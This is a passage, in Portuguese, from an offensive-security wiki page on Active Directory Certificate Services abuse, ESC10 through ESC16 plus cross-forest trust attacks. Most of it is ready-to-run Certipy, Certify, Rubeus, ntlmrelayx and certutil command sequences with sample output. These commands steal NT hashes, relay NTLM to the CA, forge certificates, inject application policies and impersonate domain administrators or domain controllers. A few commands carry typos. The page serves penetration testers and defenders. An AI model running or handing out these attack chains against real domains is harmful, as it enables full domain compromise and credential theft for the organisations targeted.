Ao tentar autenticar com o certificado emitido, agora obtém-se o hash NT de `Administrator@corp.local`. O comando deve incluir `-domain <domain>` devido à falta de especificação de domínio no certificado:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Mapeamentos de Certificados Fracos - ESC10

### Explicação

Dois valores de chave de registro no controlador de domínio são referenciados pelo ESC10:

- O valor padrão para `CertificateMappingMethods` em `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` é `0x18` (`0x8 | 0x10`), anteriormente definido como `0x1F`.
- A configuração padrão para `StrongCertificateBindingEnforcement` em `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` é `1`, anteriormente `0`.

**Caso 1**

Quando `StrongCertificateBindingEnforcement` está configurado como `0`.

**Caso 2**

Se `CertificateMappingMethods` inclui o bit `UPN` (`0x4`).

### Caso de Abuso 1

Com `StrongCertificateBindingEnforcement` configurado como `0`, uma conta A com permissões `GenericWrite` pode ser explorada para comprometer qualquer conta B.

Por exemplo, ao ter permissões `GenericWrite` sobre `Jane@corp.local`, um atacante pretende comprometer `Administrator@corp.local`. O procedimento espelha o ESC9, permitindo que qualquer modelo de certificado seja utilizado.

Inicialmente, o hash de `Jane` é obtido usando Shadow Credentials, explorando o `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Posteriormente, o `userPrincipalName` de `Jane` é alterado para `Administrator`, omitindo deliberadamente a parte `@corp.local` para evitar uma violação de restrição.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Em seguida, um certificado que permite autenticação do cliente é solicitado como `Jane`, usando o modelo `User` padrão.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
O `userPrincipalName` de `Jane` é então revertido ao seu valor original, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autenticar com o certificado obtido fornecerá o hash NT de `Administrator@corp.local`, sendo necessário especificar o domínio no comando devido à ausência de detalhes do domínio no certificado.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Caso de Abuso 2

Com `CertificateMappingMethods` contendo a flag de bit `UPN` (`0x4`), uma conta A com permissões `GenericWrite` pode comprometer qualquer conta B que não possua a propriedade `userPrincipalName`, incluindo contas de máquina e o administrador de domínio integrado `Administrator`.

Aqui, o objetivo é comprometer `DC$@corp.local`, começando por obter o hash de `Jane` através de Shadow Credentials, aproveitando o `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
O `userPrincipalName` de `Jane` é então definido como `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Um certificado para autenticação de cliente é solicitado como `Jane` usando o modelo `User` padrão.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
O `userPrincipalName` de `Jane` é revertido para o seu valor original após este processo.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Para autenticar via Schannel, é utilizada a opção `-ldap-shell` do Certipy, indicando sucesso na autenticação como `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Através do LDAP shell, comandos como `set_rbcd` permitem ataques Resource-Based Constrained Delegation (RBCD), potencialmente comprometendo o domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Essa vulnerabilidade também se estende a qualquer conta de usuário que não possua um `userPrincipalName` ou quando este não corresponda ao `sAMAccountName`, sendo a conta padrão `Administrator@corp.local` um alvo primário devido aos seus privilégios LDAP elevados e à ausência de um `userPrincipalName` por padrão.

## Relaying NTLM to ICPR - ESC11

### Explicação

Se o CA Server não estiver configurado com `IF_ENFORCEENCRYPTICERTREQUEST`, isso pode possibilitar ataques de NTLM relay sem assinatura via serviço RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Você pode usar `certipy` para enumerar se `Enforce Encryption for Requests` está Disabled e certipy mostrará `ESC11` Vulnerabilities.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Cenário de Abuso

É necessário configurar um relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Para controladores de domínio, devemos especificar `-template` em DomainController.

Ou usando [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Acesso via shell ao ADCS CA com YubiHSM - ESC12

### Explicação

Administradores podem configurar a Autoridade de Certificação para armazená‑la em um dispositivo externo como o "Yubico YubiHSM2".

Se um dispositivo USB estiver conectado ao servidor CA via uma porta USB, ou a um USB device server no caso do servidor CA ser uma máquina virtual, uma chave de autenticação (às vezes referida como "password") é exigida para o Key Storage Provider gerar e utilizar chaves no YubiHSM.

Esta chave/senha é armazenada no registro em `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` em texto claro.

Referência em [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Cenário de Abuso

Se a chave privada da CA estiver armazenada em um dispositivo USB físico e você obtiver acesso via shell, é possível recuperar a chave.

Primeiro, você precisa obter o certificado da CA (este é público) e então:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Por fim, use o comando certutil `-sign` para forjar um novo certificado arbitrário usando o certificado da CA e sua chave privada.

## OID Group Link Abuse - ESC13

### Explicação

O atributo `msPKI-Certificate-Policy` permite que a política de emissão seja adicionada ao modelo de certificado. Os objetos `msPKI-Enterprise-Oid` responsáveis por emitir políticas podem ser descobertos no Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) do contêiner PKI OID. Uma política pode ser vinculada a um grupo AD usando o atributo `msDS-OIDToGroupLink` desse objeto, permitindo que um sistema autorize um usuário que apresente o certificado como se ele fosse membro do grupo. [Referência aqui](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Em outras palavras, quando um usuário tem permissão para solicitar um certificado e o certificado está vinculado a um grupo OID, o usuário pode herdar os privilégios desse grupo.

Utilize [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) para encontrar OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Cenário de Abuso

Encontre uma permissão de usuário — pode usar `certipy find` ou `Certify.exe find /showAllPermissions`.

Se `John` tiver permissão para enroll `VulnerableTemplate`, o usuário pode herdar os privilégios do grupo `VulnerableGroup`.

Tudo o que ele precisa fazer é especificar o template; ele receberá um certificado com direitos OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configuração vulnerável de renovação de certificado - ESC14

### Explicação

A descrição em https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping é notavelmente completa. Abaixo está uma citação do texto original.

ESC14 aborda vulnerabilidades que surgem de "weak explicit certificate mapping", principalmente pelo uso indevido ou configuração insegura do atributo `altSecurityIdentities` em contas de usuário ou computador do Active Directory. Esse atributo multi-valor permite que administradores associem manualmente certificados X.509 a uma conta AD para fins de autenticação. Quando preenchido, esses mapeamentos explícitos podem sobrescrever a lógica padrão de mapeamento de certificados, que normalmente depende de UPNs ou nomes DNS no SAN do certificado, ou do SID incorporado na extensão de segurança `szOID_NTDS_CA_SECURITY_EXT`.

Um mapeamento "fraco" ocorre quando o valor string usado dentro do atributo `altSecurityIdentities` para identificar um certificado é muito amplo, facilmente adivinhável, depende de campos de certificado não-únicos, ou usa componentes de certificado facilmente falsificáveis. Se um atacante puder obter ou criar um certificado cujos atributos correspondam a um mapeamento explícito definido de forma fraca para uma conta privilegiada, ele pode usar esse certificado para autenticar-se como e se passar por essa conta.

Exemplos de strings de mapeamento `altSecurityIdentities` potencialmente fracas incluem:

- Mapeamento apenas por um Subject Common Name (CN) comum: ex., `X509:<S>CN=SomeUser`. Um atacante pode conseguir um certificado com esse CN a partir de uma fonte menos segura.
- Uso de Issuer Distinguished Names (DNs) ou Subject DNs excessivamente genéricos sem qualificação adicional como um número de série específico ou subject key identifier: ex., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Emprego de outros padrões previsíveis ou identificadores não-cripográficos que um atacante possa satisfazer em um certificado que possa legítima ou forjadamente obter (se tiver comprometido uma CA ou encontrado um template vulnerável como em ESC1).

O atributo `altSecurityIdentities` suporta vários formatos para mapeamento, tais como:

- `X509:<I>IssuerDN<S>SubjectDN` (mapeia pelo Issuer e Subject DN completos)
- `X509:<SKI>SubjectKeyIdentifier` (mapeia pelo valor da extensão Subject Key Identifier do certificado)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapeia pelo número de série, implicitamente qualificado pelo Issuer DN) - isto não é um formato padrão, geralmente é `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapeia por um nome RFC822, tipicamente um endereço de email, do SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapeia por um hash SHA1 da chave pública bruta do certificado - geralmente forte)

A segurança desses mapeamentos depende fortemente da especificidade, unicidade e força criptográfica dos identificadores de certificado escolhidos na string de mapeamento. Mesmo com modos de ligação de certificado fortes habilitados nos Domain Controllers (que afetam principalmente mapeamentos implícitos baseados em SAN UPNs/DNS e a extensão SID), uma entrada `altSecurityIdentities` mal configurada ainda pode apresentar um caminho direto para impersonação se a própria lógica de mapeamento for falha ou permissiva demais.

### Cenário de Abuso

ESC14 mira em **mapeamentos explícitos de certificados** no Active Directory (AD), especificamente o atributo `altSecurityIdentities`. Se esse atributo estiver definido (por design ou má configuração), atacantes podem se passar por contas apresentando certificados que correspondam ao mapeamento.

#### Cenário A: O atacante pode gravar em `altSecurityIdentities`

**Pré-condição**: O atacante tem permissões de escrita no atributo `altSecurityIdentities` da conta alvo ou permissão para concedê-lo na forma de uma das seguintes permissões no objeto AD alvo:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Cenário B: O alvo tem mapeamento fraco via X509RFC822 (Email)

- **Pré-condição**: O alvo possui um mapeamento X509RFC822 fraco em altSecurityIdentities. Um atacante pode definir o atributo mail da vítima para corresponder ao nome X509RFC822 do alvo, solicitar um certificado como a vítima, e usá-lo para autenticar-se como o alvo.

#### Cenário C: O alvo tem mapeamento X509IssuerSubject

- **Pré-condição**: O alvo possui um mapeamento explícito X509IssuerSubject fraco em `altSecurityIdentities`. O atacante pode definir o atributo `cn` ou `dNSHostName` em um principal vítima para corresponder ao subject do mapeamento X509IssuerSubject do alvo. Então, o atacante pode solicitar um certificado como a vítima e usar esse certificado para autenticar-se como o alvo.

#### Cenário D: O alvo tem mapeamento X509SubjectOnly

- **Pré-condição**: O alvo possui um mapeamento explícito X509SubjectOnly fraco em `altSecurityIdentities`. O atacante pode definir o atributo `cn` ou `dNSHostName` em um principal vítima para corresponder ao subject do mapeamento X509SubjectOnly do alvo. Então, o atacante pode solicitar um certificado como a vítima e usar esse certificado para autenticar-se como o alvo.

### concrete operations
#### Scenario A

Request a certificate of the certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Salvar e converter o certificado
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autenticar (usando o certificado)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Limpeza (opcional)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Para métodos de ataque mais específicos em vários cenários, por favor consulte o seguinte: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## Políticas de Aplicação EKUwu (CVE-2024-49019) - ESC15

### Explicação

A descrição em https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc é extraordinariamente detalhada. Abaixo está uma citação do texto original.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Abuso

O seguinte é referenciado em [este link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Clique para ver métodos de uso mais detalhados.


O comando `find` do Certipy pode ajudar a identificar templates V1 que potencialmente são suscetíveis ao ESC15 se a CA não estiver corrigida.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Cenário A: Impersonação Direta via Schannel

**Passo 1: Solicitar um certificado, injetando a Application Policy "Client Authentication" e o UPN de destino.** O atacante `attacker@corp.local` tem como alvo `administrator@corp.local` usando o template "WebServer" V1 (que permite subject fornecido pelo inscrito).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: O template V1 vulnerável com "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Injeta o OID `1.3.6.1.5.5.7.3.2` na extensão Application Policies do CSR.
- `-upn 'administrator@corp.local'`: Define o UPN no SAN para impersonação.

**Passo 2: Autenticar via Schannel (LDAPS) usando o certificado obtido.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Cenário B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Passo 1: Solicitar um certificado de um V1 template (with "Enrollee supplies subject"), injetando a "Certificate Request Agent" Application Policy.** Este certificado é para o atacante (`attacker@corp.local`) tornar-se um enrollment agent. Nenhum UPN é especificado para a identidade do atacante aqui, já que o objetivo é a capacidade de agente.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injeta OID `1.3.6.1.4.1.311.20.2.1`.

**Passo 2: Use o certificado "agent" para solicitar um certificado em nome de um usuário privilegiado alvo.** Este é um passo ESC3-like, usando o certificado do Passo 1 como o certificado "agent".
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Passo 3: Autentique-se como o usuário privilegiado usando o certificado "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Explanation

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** refere-se ao cenário em que, se a configuração do AD CS não impor a inclusão da extensão **szOID_NTDS_CA_SECURITY_EXT** em todos os certificados, um atacante pode explorar isso da seguinte forma:

1. Solicitar um certificado **without SID binding**.

2. Usar este certificado **for authentication as any account**, por exemplo, personificando uma conta de alto privilégio (p.ex., um Domain Administrator).

Você também pode consultar este artigo para aprender mais sobre o princípio detalhado: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

O seguinte faz referência a [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), Clique para ver métodos de uso mais detalhados.

Para identificar se o ambiente Active Directory Certificate Services (AD CS) é vulnerável ao **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Passo 1: Ler UPN inicial da conta da vítima (Opcional - para restauração).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Passo 2: Atualize o UPN da conta da vítima para o `sAMAccountName` do administrador alvo.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Passo 3: (Se necessário) Obter credenciais para a conta "vítima" (por exemplo, via Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Etapa 4: Solicite um certificado como o usuário "victim" a partir de _qualquer template de autenticação de cliente adequado_ (por exemplo, "User") na CA vulnerável ao ESC16.** Como a CA é vulnerável ao ESC16, ela omitirá automaticamente a extensão de segurança SID do certificado emitido, independentemente das configurações específicas do template para essa extensão. Defina a variável de ambiente do cache de credenciais Kerberos (comando shell):
```bash
export KRB5CCNAME=victim.ccache
```
Em seguida, solicite o certificado:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Passo 5: Reverter o UPN da conta "vítima".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Passo 6: Autenticar-se como o administrador de destino.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Compromising Forests with Certificates Explained in Passive Voice

### Breaking of Forest Trusts by Compromised CAs

A configuração para **cross-forest enrollment** é relativamente direta. O **root CA certificate** da resource forest é **published to the account forests** pelos administradores, e os certificados do **enterprise CA** da resource forest são **added to the `NTAuthCertificates` and AIA containers in each account forest**. Para esclarecer, esse arranjo concede ao **CA in the resource forest complete control** sobre todas as outras florestas para as quais ele gerencia PKI. Caso esse CA seja **compromised by attackers**, certificados para todos os usuários tanto da resource quanto das account forests poderiam ser **forged by them**, rompendo assim a fronteira de segurança da floresta.

### Enrollment Privileges Granted to Foreign Principals

Em ambientes multi-floresta, é necessário ter cautela com Enterprise CAs que **publish certificate templates** que permitem que **Authenticated Users or foreign principals** (usuários/grupos externos à floresta à qual a Enterprise CA pertence) tenham **enrollment and edit rights**.\
Ao autenticar-se através de uma trust, o **Authenticated Users SID** é adicionado ao token do usuário pelo AD. Assim, se um domínio possuir uma Enterprise CA com um template que **allows Authenticated Users enrollment rights**, um template poderia potencialmente ser **enrolled in by a user from a different forest**. Da mesma forma, se **enrollment rights are explicitly granted to a foreign principal by a template**, uma **cross-forest access-control relationship is thereby created**, permitindo que um principal de uma floresta **enroll in a template from another forest**.

Ambos os cenários levam a um **increase in the attack surface** de uma floresta para outra. As configurações do certificate template poderiam ser exploradas por um atacante para obter privilégios adicionais em um domínio estrangeiro.


## Referências

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
